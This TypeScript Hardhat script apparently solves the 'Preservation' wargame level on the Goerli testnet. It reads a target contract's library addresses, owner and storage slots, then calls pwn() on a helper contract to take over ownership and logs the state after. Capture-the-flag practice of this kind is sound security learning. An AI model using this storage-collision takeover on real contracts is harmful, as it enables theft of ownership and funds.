import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x0354405E35a477766AE6fec602f6f268D5938af4"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "address",
          name: "_timeZone1LibraryAddress",
          type: "address",
        },
        {
          internalType: "address",
          name: "_timeZone2LibraryAddress",
          type: "address",
        },
      ],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_timeStamp",
          type: "uint256",
        },
      ],
      name: "setFirstTime",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xf1e02620",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_timeStamp",
          type: "uint256",
        },
      ],
      name: "setSecondTime",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x5bda8fa4",
    },
    {
      inputs: [],
      name: "timeZone1Library",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x3dc79422",
    },
    {
      inputs: [],
      name: "timeZone2Library",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x27d6974f",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Preservation")

  console.log(await target.timeZone1Library())
  console.log(await target.timeZone2Library())
  console.log(await target.owner())

  // // read storage
  for (let index = 0; index < 4; index++) {
    console.log(await provider.getStorageAt(targetAddress, index))
  }

  const tx = await contract.pwn(targetAddress, { gasLimit: 100000 })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  // read storage
  for (let index = 0; index < 4; index++) {
    console.log(await provider.getStorageAt(targetAddress, index))
  }

  console.log(await target.timeZone1Library())
  console.log(await target.timeZone2Library())
  console.log("owner", await target.owner())
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
